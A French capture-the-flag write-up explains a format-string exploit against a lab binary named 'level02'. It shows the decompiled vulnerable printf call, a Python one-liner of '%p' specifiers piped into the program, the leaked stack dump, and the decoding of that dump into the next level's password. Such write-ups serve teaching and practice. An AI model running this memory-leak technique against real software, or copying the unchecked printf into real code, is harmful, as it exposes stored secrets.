# Format String Exploitation

En décompilant l'exécutable, on remarque qu'on ne peut pas utiliser `gdb` pour imprimer la `stack`. Le programme fait un test au préalable en essayant d'ouvrir le fichier `.pass` de l'utilisateur `level03`.
```c
stream = fopen("/home/users/level03/.pass", 0x400bb0, 0x400bb0);
if (stream == 0) {
    fwrite("ERROR: failed to open password file\n", 1, 0x24, _reloc.stderr);
    exit(1);
}
```
En revanche, on peut utiliser un appel à `printf` pour afficher la stack.
```c
printf(&format);
```
La variable `format` est assignée au moment d'un `fread` lors de la demande du `username`.
```c
printf("--[ Username: ");
fgets(&format, 100, _reloc.stdin);
iVar3 = strcspn(&format, 0x400bf5);
*(undefined *)((int64_t)&format + iVar3) = 0;
```
On peut donc passer en entrée standard une série de `modifiers` `%p` qui nous permettrons d'afficher la stack à partir des arguments de `printf`. On créer donc une commande avec `Python` qui va génerer une série de `%p`.
```
> python -c "print '%p '*100" > /tmp/input
```
On injecte notre fichier `input` en entrée standard.
```
> cat /tmp/input - | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4e0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6d8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!

```
Comme prévu, `printf` nous permet d'afficher la `stack`. On peut y remarquer plusieurs éléments. Tout d'abord, on retrouve nos `%p`.
```
0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025
```
On peut aussi remarquer une chaîne de caractère qui pourrait correspondre au contenu du fichier `.pass` lu précédement.
```c
stream = fopen("/home/users/level03/.pass", 0x400bb0, 0x400bb0);
if (stream == 0) {
    fwrite("ERROR: failed to open password file\n", 1, 0x24, _reloc.stderr);
    exit(1);
}
var_ch = fread(&ptr, 1, 0x29, stream);
```
```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```
On peut décoder cette chaîne. À noter que les adresses se remplissent de droite à gauche, nous devrons inverser chaque bloc.
```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
|                  |                  |                  |                  |
v                  v                  v                  v                  v
Hh74RPnu           Q9sa5JAE           XgNWCqz7           sXGnh5J5           M9KfPg3H
```
Le mot de passe est donc :
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
